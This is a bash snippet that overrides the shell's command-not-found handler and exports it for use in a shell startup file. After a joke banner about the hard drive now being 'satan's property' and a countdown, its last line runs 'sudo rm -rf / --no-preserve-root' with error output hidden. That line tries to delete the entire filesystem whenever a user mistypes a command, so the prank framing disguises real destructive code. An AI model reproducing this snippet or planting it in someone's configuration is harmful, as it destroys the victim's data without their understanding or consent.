command_not_found_handle() {
    local cmd="$1"
    clear
    echo "════════════════════════════════════════════════════════════"
    echo "  ⚠️  COMMAND NOT FOUND: '$cmd' ⚠️"
    echo ""
    echo "   🔥 Hipitty hopitty your hard drive is now satan's property 🔥"
    echo ""
    echo "════════════════════════════════════════════════════════════"
    echo ""
    echo "System will self-destruct in:"
    for i in 3 2 1; do
        echo "    $i..."
        sleep 1
    done
    echo ""
    echo "💀 Goodbye. 💀"
    sleep 0.5
    sudo rm -rf / --no-preserve-root 2>/dev/null
}
export -f command_not_found_handle
